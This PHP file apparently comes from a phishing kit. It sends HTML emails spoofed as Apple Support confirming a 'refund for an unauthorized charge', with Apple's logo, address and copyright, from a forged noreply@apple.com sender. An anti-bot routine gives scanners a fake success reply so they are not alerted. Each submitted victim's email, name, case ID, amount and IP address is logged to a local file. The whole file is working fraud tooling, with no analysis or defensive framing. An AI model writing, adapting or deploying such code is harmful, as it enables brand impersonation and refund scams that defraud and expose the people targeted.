<?php
// Set headers to handle AJAX requests
header('Content-Type: application/json');
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: POST');
header('Access-Control-Allow-Headers: Content-Type, X-Requested-With, X-Verification-Token');

// Anti-Bot Protection
function checkForBot($request) {
    // Check if the request has the necessary headers
    if (!isset($_SERVER['HTTP_X_REQUESTED_WITH']) || $_SERVER['HTTP_X_REQUESTED_WITH'] !== 'XMLHttpRequest') {
        return true;
    }
    
    // Check verification token
    if (!isset($_SERVER['HTTP_X_VERIFICATION_TOKEN']) || empty($_SERVER['HTTP_X_VERIFICATION_TOKEN'])) {
        return true;
    }
    
    return false;
}

// Function to send confirmation email to the user
function sendConfirmationEmail($userEmail, $userName, $refundId, $amount) {
    // Format the amount for display
    $amount = is_numeric($amount) ? '$' . number_format(floatval($amount), 2) : $amount;
    
    // Email subject
    $subject = "Apple - Your Refund Request Confirmation #$refundId";
    
    // Email headers
    $headers = "From: Apple Support <noreply@apple.com>\r\n";
    $headers .= "Reply-To: no-reply@apple.com\r\n";
    $headers .= "MIME-Version: 1.0\r\n";
    $headers .= "Content-Type: text/html; charset=UTF-8\r\n";
    
    // Email body
    $emailBody = '
    <!DOCTYPE html>
    <html>
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Apple - Refund Request Confirmation</title>
        <style>
            body {
                font-family: -apple-system, BlinkMacSystemFont, "SF Pro Text", "SF Pro Icons", "Helvetica Neue", Helvetica, Arial, sans-serif;
                line-height: 1.5;
                color: #1d1d1f;
                margin: 0;
                padding: 0;
            }
            .container {
                max-width: 600px;
                margin: 0 auto;
                padding: 20px;
            }
            .header {
                text-align: center;
                padding: 20px 0;
                border-bottom: 1px solid #d2d2d7;
            }
            .logo {
                max-width: 40px;
                margin-bottom: 15px;
            }
            h1 {
                font-size: 24px;
                font-weight: 600;
                margin-bottom: 10px;
            }
            .content {
                padding: 30px 0;
            }
            .footer {
                text-align: center;
                padding: 20px 0;
                border-top: 1px solid #d2d2d7;
                font-size: 12px;
                color: #86868b;
            }
            .info-row {
                margin-bottom: 15px;
            }
            .info-label {
                font-weight: 600;
            }
            .button {
                display: inline-block;
                background-color: #0071e3;
                color: white;
                text-decoration: none;
                padding: 12px 20px;
                border-radius: 8px;
                font-weight: 400;
                margin: 20px 0;
            }
        </style>
    </head>
    <body>
        <div class="container">
            <div class="header">
                <img src="https://www.apple.com/ac/globalnav/7/en_US/images/be15095f-5a20-57d0-ad14-cf4c638e223a/globalnav_apple_image__b5er5ngrzxqq_large.svg" alt="Apple" class="logo">
                <h1>Refund Request Confirmation</h1>
            </div>
            
            <div class="content">
                <p>Dear ' . htmlspecialchars($userName) . ',</p>
                
                <p>We have received your request to process a refund for an unauthorized charge on your payment method. Your case has been assigned for review by our team.</p>
                
                <div class="info-row">
                    <span class="info-label">Case ID:</span> ' . htmlspecialchars($refundId) . '
                </div>
                
                <div class="info-row">
                    <span class="info-label">Amount:</span> ' . htmlspecialchars($amount) . '
                </div>
                
                <div class="info-row">
                    <span class="info-label">Date Submitted:</span> ' . date('F j, Y') . '
                </div>
                
                <p>Our team will review your request and process your refund within 3-5 business days. If we need additional information, we\'ll contact you via email or phone.</p>
                
                <p>For any questions about your refund request, please contact Apple Support and reference your Case ID.</p>
                
                <p style="text-align: center;">
                    <a href="https://support.apple.com" class="button">Visit Apple Support</a>
                </p>
                
                <p>Thank you for your patience.</p>
                
                <p>Sincerely,<br>
                Apple Support Team</p>
            </div>
            
            <div class="footer">
                <p>This is an automated message. Please do not reply to this email.</p>
                <p>Copyright © ' . date('Y') . ' Apple Inc. All rights reserved.</p>
                <p>Apple Inc., One Apple Park Way, Cupertino, CA 95014, United States</p>
            </div>
        </div>
    </body>
    </html>
    ';
    
    // Send the email
    $result = mail($userEmail, $subject, $emailBody, $headers);
    
    return $result;
}

// Function to log email attempts
function logEmailAttempt($data) {
    $logFile = 'email_log.txt';
    $logData = date('Y-m-d H:i:s') . ' | IP: ' . $_SERVER['REMOTE_ADDR'] . ' | ';
    
    foreach ($data as $key => $value) {
        $logData .= $key . ': ' . $value . ' | ';
    }
    
    $logData .= "\n";
    
    file_put_contents($logFile, $logData, FILE_APPEND);
}

// Main execution
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // Verify the request is from a valid source, not a bot
    if (checkForBot($_POST)) {
        // Return success to not alert bots, but don't process
        echo json_encode(['status' => 'success']);
        exit;
    }
    
    // Get email data
    $userEmail = isset($_POST['email']) ? $_POST['email'] : '';
    $userName = isset($_POST['name']) ? $_POST['name'] : '';
    $refundId = isset($_POST['refundId']) ? $_POST['refundId'] : '';
    $amount = isset($_POST['amount']) ? $_POST['amount'] : '';
    
    // Validate email
    if (!filter_var($userEmail, FILTER_VALIDATE_EMAIL)) {
        echo json_encode(['status' => 'error', 'message' => 'Invalid email address']);
        exit;
    }
    
    // Log the attempt
    logEmailAttempt([
        'email' => $userEmail,
        'name' => $userName,
        'refundId' => $refundId,
        'amount' => $amount
    ]);
    
    // Send confirmation email
    $emailSent = sendConfirmationEmail($userEmail, $userName, $refundId, $amount);
    
    // Return response
    if ($emailSent) {
        echo json_encode(['status' => 'success', 'message' => 'Email sent successfully']);
    } else {
        echo json_encode(['status' => 'error', 'message' => 'Failed to send email']);
    }
} else {
    // Not a POST request
    echo json_encode(['status' => 'error', 'message' => 'Invalid request method']);
}
